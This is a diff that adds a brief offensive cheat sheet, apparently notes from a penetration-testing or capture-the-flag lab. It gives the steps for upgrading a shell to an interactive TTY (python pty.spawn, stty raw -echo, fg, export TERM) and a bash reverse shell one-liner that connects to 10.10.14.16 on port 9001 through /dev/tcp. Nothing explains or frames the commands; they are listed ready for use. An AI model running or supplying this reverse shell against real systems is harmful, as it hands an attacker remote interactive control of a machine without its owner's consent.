@@ -1,0 +1,18 @@
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+CTRL + Z
+
+stty raw -echo
+
+fg & enter enter
+
+export TERM=xterm
+
+--------------
+#Bash reverse shell
+
+#reverse shell
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.16/9001 0>&1'
+
+
